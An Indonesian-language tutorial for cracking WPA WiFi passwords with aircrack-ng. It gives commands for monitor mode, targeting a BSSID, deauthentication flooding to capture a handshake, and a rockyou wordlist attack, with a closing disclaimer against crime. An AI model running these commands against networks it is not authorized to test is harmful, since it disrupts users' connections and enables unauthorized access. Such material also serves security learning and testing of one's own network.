# hacking-wifi >>> airmon-ng >>> aerodump-ng >>> aircrack-ng 

sekedar catatan jika lupa </p>
untuk memulai percobaan harap memakai jaringan wifi kalian terlebih dahulu..

## TUTORIAL HACK WIFI + CRACKING 

untuk membuka ip address ketikkan perintah :
```bash
ip addr
```

pengaturan semula wificard biasanya dalam mode managed 
bisa di cek lewat perintah :
```bash
iwconfig
```
untuk menghindari konfik jaringan (refresh) bisa dengan perintah :</p>
catatan : ini mematikan semua koneksi internet!
```bash
sudo airmon-ng check kill
```
untuk mengubah dari mode managed ke mode monitor :
```bash
sudo airmon-ng start wlan0
```
ketikkan perintah di bawah ini untuk cek apakah sudah dalam mode monitor atau tidak
```bash
iwconfig
```
cek nama interface wifi - wificard : umunnya adalah wlan0/wlan0mon
```bash
sudo airmon-ng
```
untuk memonitoring jaringan wifi yang tersedia :</p> 
(ctrl+c) untuk stop scan 
```bash
sudo airodump-ng wlan0
```
jangan lupa untuk mencatatat bssid target dan channelnya...
</p>
catat bssid target contoh  : 98:F4:28:47:85:C8 >>> berada di channel : 11</p>
<p>
jika sudah kita saring/filter single target memakai perintah :

```bash
sudo airodump-ng wlan0 -d 98:F4:28:47:85:C8
```
sekarang waktunya menyimpan + menjalankan progam jahatnya..
sebagai contoh seperti ini : 
```bash
sudo airodump-ng -w hack1 -c 11 --bssid 98:F4:28:47:85:C8 wlan0
```
catatan : 
* opsi -w untuk menyimpan file 
* opsi hack1 : nama file
* opsi -c : channel wifi
* opsi --bssid : alamat bssid target (ganti bssid target yg di atas hanyalah sebuah contoh saja)
* opsi wlan0 nama perangkat wifi/card

setelah dirasa sudah paham bukalah terminal baru / tab baru
ketikkan :
```bash
sudo aireplay-ng --deauth 0 -a 98:F4:28:47:85:C8 wlan0 
```
jika berhasill sniff jaringan ada yg berjabat tangan
otomatis di terminal pertama akan ada tulisan </p>
(wpa handsake)
atau tulisan AEPOL / apa ya saya lupa ...</p>
itu berarti program sdh berhasil mendapatkan jabat-tangannya.
</p>
harap di ingat kita hanya butuh 2 tab terminal yg berjalan..
</p>
silahkan close semua program di terminalnya,
</p>
bisa menggunakan >>> ctrl+c 
</p>
sekarang waktunya ganti program aircrack
</p>
perlu diketahui file yg tersimpan biasanya tersimpan di path HOME/
</p>
untuk mengetahui tentang informasi hasil snif tsb 
</p>
bukalah file - contoh file hack1.pap dengan program wireshark
</p>
bisa dilakukan dengan terminal di path nya:

```bash
wireshark hack1-01.cap
```
atau bisa membuka dengan doble click di filenya
</p>
opsional : untuk menghidupkan jaringan internet seperti semula :

```bash
sudo airmon-ng stop wlan0 - monitor disable
```
sekarang kita akan menjalankan program AIRCRACK
</p>
ketikkan :

```bash
sudo aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt
```
gantilah nama file hack1-01.cap dengan file yg tersimpan di direktori kalian </p>
catatan :</p>
jika file rockyou.txt blm ada kalian bisa ektrak dlu file tsb</p>
cari di direktori /usr/share/wordlist/</p>

tunggu beberapa saat aircrack mengidentifikasi sandi </p>
hasil crack sandi berbeda-beda tergantung kesulitannya</p>
semakin rumit sandi itu akan semakin lama </p>
apalagi sandi tsb di atas 10 karakter dan angka</p> 
jadi jangan berharap itu bs berhasil cepat dan sempurna...</p>




opsional : tambahan untuk mengecek wifi adapter kamu support inject atau tidak nya :
```bash
aireplay-ng -9 wlan0
```
```bash
iw list | grep AP$
```

sekian catatan informasi untuk menjalankan sebuah program aircrack dan kawan2nya....</p>

## DILARANG KERAS UNTUK MELAKUKAN TINDAK KEJAHATAN
